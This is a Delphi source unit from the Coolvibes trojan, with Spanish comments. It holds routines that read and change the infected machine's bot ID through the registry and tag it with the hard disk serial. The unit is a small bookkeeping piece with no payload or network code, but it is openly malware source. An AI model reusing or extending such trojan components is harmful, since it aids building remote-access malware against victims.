{Unit perteneciente al troyano Coolvibes que contiene las funciones
para cambiar la ID de un server}
unit unitCambioID;

interface

uses
 Windows, sysutils,  SettingsDef, UnitVariables,  minireg, UnitFunciones;


procedure CambiarID(NvoNombre: string);
function LeerID(): string;

implementation

function LeerId(): string;
begin

  RegGetString(HKEY_CURRENT_USER, 'Software\'+Configuracion.sID+'\ID', Result);
  //Si no lo lee del registro lo intenta leer de si mismo, de la configuracion que guardo el editor

  if Result = '' then
    Result := Configuracion.sID;

  if Result = '' then
    Result := 'Coolvibes';//Finalmente si no hoy nada escrito en la configuracion devuelve el valor por defecto

  Result := trim(Result)+'_'+GetHardDiskSerial;//Le agregamos el serial del disco duro



end;

procedure CambiarId(nvoNombre: string);
begin
  RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\ID', nvoNombre+#15);
end;

end.
